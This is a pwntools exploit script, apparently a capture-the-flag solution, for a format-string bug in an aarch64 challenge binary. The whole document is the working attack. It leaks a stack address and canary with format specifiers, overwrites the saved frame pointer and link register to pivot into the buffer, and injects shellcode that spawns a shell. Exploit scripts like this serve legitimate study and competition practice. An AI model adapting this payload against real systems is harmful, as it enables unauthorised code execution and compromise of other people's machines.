from pwn import *
context.arch = 'aarch64'

EXE = "./chall"
#PRINTED = 0x10
OFFSET = 15
PORT = 24038

def exec_fmt(payload):
    r = process(EXE)
    r.clean()
    r.sendline(payload)
    r.shutdown(direction="send")
    data = r.recvline()
    print(payload)
    print([data])
    r.close()
    return data

autofmt = FmtStr(exec_fmt)

#r = process(["/home/kylebot/src/qemu/build/qemu-aarch64", "-g", "1234", "./chall"])
#r = process(["./chall"])
#r = process(["qemu-aarch64-static", "-g", "1234", "./chall"])
r = remote("127.0.0.1", PORT)


# leak stack addr & canary in the first printf
r.sendlineafter(":P)\n", "%142$p_%141$p")
a, b = r.recvline().strip().split(b'_')
stack_ptr = int(a, 16)
canary = int(b, 16)
log.info("stack_ptr: %#x" % stack_ptr)
target_addr = stack_ptr - 0x480
log.info("target_addr: %#x" % target_addr)
log.info("canary: %#x" % canary)

# overwrite lr and fp and pivot to the buffer
buffer = target_addr + 0x28 + 0x200 +0x30
log.info("buffer: %#x" % buffer)
writes = {target_addr+8: buffer, target_addr:buffer}
fmt = fmtstr_payload(OFFSET, writes, numbwritten=autofmt.padlen)
assert(len(fmt) <= 0x1f0)
payload = fmt.ljust(0x1f0, b'\x00')

pivot_payload = p64(0) + p64(0x41414141) + p64(0x4141)*4
r.sendline(payload + pivot_payload + asm(shellcraft.linux.sh()))


r.interactive()
